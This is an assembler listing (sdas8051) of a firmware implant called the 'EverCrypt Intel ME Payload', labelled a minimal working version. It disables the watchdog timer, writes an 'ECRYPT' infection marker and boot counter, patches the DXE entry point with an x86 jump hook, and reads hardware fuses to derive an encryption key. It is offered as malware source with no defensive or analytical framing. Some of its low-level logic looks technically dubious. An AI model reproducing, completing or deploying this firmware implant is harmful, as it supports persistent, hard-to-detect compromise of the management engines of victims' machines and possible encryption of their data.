                                      1 ;;; ===========================================================================
                                      2 ;;; EverCrypt Intel ME Payload - Minimal Working Version
                                      3 ;;; Assembler: sdas8051 (SDCC)
                                      4 ;;; ===========================================================================
                                      5 
                                      6         .module evercrypt_me
                                      7         
                                      8 ;;; ===========================================================================
                                      9 ;;; Code Area
                                     10 ;;; ===========================================================================
                                     11 
                                     12         .area   CSEG    (CODE)
                                     13         .area   GSINIT  (CODE)
                                     14         .area   GSFINAL (CODE)
                                     15 
                                     16 ;;; ===========================================================================
                                     17 ;;; Constants
                                     18 ;;; ===========================================================================
                                     19 
                           000800    20 WDT_CTRL        =       0x0800
                           002000    21 HECI_CSR        =       0x2000
                           00FFF0    22 ME_SIG_ADDR     =       0xFFF0
                           00FFF8    23 ME_BOOT_CNT     =       0xFFF8
                           000000    24 DXE_ENTRY       =       0x0000
                           001300    25 HAP_BIT         =       0x1300
                                     26 
                                     27 ;;; ===========================================================================
                                     28 ;;; Reset Vector (execution starts here)
                                     29 ;;; ===========================================================================
                                     30 
                                     31         .area   CSEG    (CODE)
                                     32 
                                     33         ;; Reset vector at 0x0000
      000000 02r00r30         [24]   34         ljmp    start
                                     35 
                                     36         ;; Skip interrupt vectors (0x03-0x2F)
      000003                         37         .ds     0x2D
                                     38 
                                     39 ;;; ===========================================================================
                                     40 ;;; Main Entry Point
                                     41 ;;; ===========================================================================
                                     42 
      000030                         43 start:
                                     44         ;; Disable watchdog timer
      000030 90 08 00         [24]   45         mov     dptr, #WDT_CTRL
      000033 E4               [12]   46         clr     a
      000034 F0               [24]   47         movx    @dptr, a
                                     48 
                                     49         ;; Write infection marker
      000035r00r3D            [12]   50         acall   mark_infection
                                     51 
                                     52         ;; Install DXE hooks
      000037r00r5E            [12]   53         acall   install_hooks
                                     54 
                                     55         ;; Derive encryption key
      000039r00r78            [12]   56         acall   derive_key
                                     57 
                                     58         ;; Enter infinite loop
      00003B 80 FE            [24]   59         sjmp    .
                                     60 
                                     61 ;;; ===========================================================================
                                     62 ;;; MARK_INFECTION - Write signature
                                     63 ;;; ===========================================================================
                                     64 
      00003D                         65 mark_infection:
      00003D 90 FF F0         [24]   66         mov     dptr, #ME_SIG_ADDR
                                     67         
      000040 74 45            [12]   68         mov     a, #0x45        ; 'E'
      000042 F0               [24]   69         movx    @dptr, a
      000043 A3               [24]   70         inc     dptr
                                     71         
      000044 74 43            [12]   72         mov     a, #0x43        ; 'C'
      000046 F0               [24]   73         movx    @dptr, a
      000047 A3               [24]   74         inc     dptr
                                     75         
      000048 74 52            [12]   76         mov     a, #0x52        ; 'R'
      00004A F0               [24]   77         movx    @dptr, a
      00004B A3               [24]   78         inc     dptr
                                     79         
      00004C 74 59            [12]   80         mov     a, #0x59        ; 'Y'
      00004E F0               [24]   81         movx    @dptr, a
      00004F A3               [24]   82         inc     dptr
                                     83         
      000050 74 50            [12]   84         mov     a, #0x50        ; 'P'
      000052 F0               [24]   85         movx    @dptr, a
      000053 A3               [24]   86         inc     dptr
                                     87         
      000054 74 54            [12]   88         mov     a, #0x54        ; 'T'
      000056 F0               [24]   89         movx    @dptr, a
                                     90 
                                     91         ;; Increment boot counter
      000057 90 FF F8         [24]   92         mov     dptr, #ME_BOOT_CNT
      00005A E0               [24]   93         movx    a, @dptr
      00005B 04               [12]   94         inc     a
      00005C F0               [24]   95         movx    @dptr, a
                                     96 
      00005D 22               [24]   97         ret
                                     98 
                                     99 ;;; ===========================================================================
                                    100 ;;; INSTALL_HOOKS - Patch DXE entry point
                                    101 ;;; ===========================================================================
                                    102 
      00005E                        103 install_hooks:
                                    104         ;; Enable HECI
      00005E 90 20 00         [24]  105         mov     dptr, #HECI_CSR
      000061 74 01            [12]  106         mov     a, #0x01
      000063 F0               [24]  107         movx    @dptr, a
                                    108 
                                    109         ;; Write x86 jump instruction
      000064 90 00 00         [24]  110         mov     dptr, #DXE_ENTRY
      000067 74 EA            [12]  111         mov     a, #0xEA        ; LJMP opcode
      000069 F0               [24]  112         movx    @dptr, a
                                    113         
      00006A A3               [24]  114         inc     dptr
      00006B 74 00            [12]  115         mov     a, #0x00
      00006D F0               [24]  116         movx    @dptr, a
                                    117         
      00006E A3               [24]  118         inc     dptr
      00006F 74 10            [12]  119         mov     a, #0x10
      000071 F0               [24]  120         movx    @dptr, a
                                    121         
      000072 A3               [24]  122         inc     dptr
      000073 E4               [12]  123         clr     a
      000074 F0               [24]  124         movx    @dptr, a
                                    125         
      000075 A3               [24]  126         inc     dptr
      000076 F0               [24]  127         movx    @dptr, a
                                    128 
      000077 22               [24]  129         ret
                                    130 
                                    131 ;;; ===========================================================================
                                    132 ;;; DERIVE_KEY - Read hardware fuses
                                    133 ;;; ===========================================================================
                                    134 
      000078                        135 derive_key:
      000078 90 10 00         [24]  136         mov     dptr, #0x1000   ; Fuse base address
      00007B 78 30            [12]  137         mov     r0, #0x30       ; Internal RAM storage
      00007D 7F 20            [12]  138         mov     r7, #32         ; 32 bytes
                                    139 
      00007F                        140 derive_loop:
      00007F E0               [24]  141         movx    a, @dptr
      000080 F6               [12]  142         mov     @r0, a
      000081 A3               [24]  143         inc     dptr
      000082 08               [12]  144         inc     r0
      000083 DF FA            [24]  145         djnz    r7, derive_loop
                                    146 
                                    147         ;; Simple mixing
      000085 78 30            [12]  148         mov     r0, #0x30
      000087 7F 20            [12]  149         mov     r7, #32
                                    150 
      000089                        151 mix_loop:
      000089 E6               [12]  152         mov     a, @r0
      00008A 64 A5            [12]  153         xrl     a, #0xA5
      00008C 23               [12]  154         rl      a
      00008D F6               [12]  155         mov     @r0, a
      00008E 08               [12]  156         inc     r0
      00008F DF F8            [24]  157         djnz    r7, mix_loop
                                    158 
      000091 22               [24]  159         ret
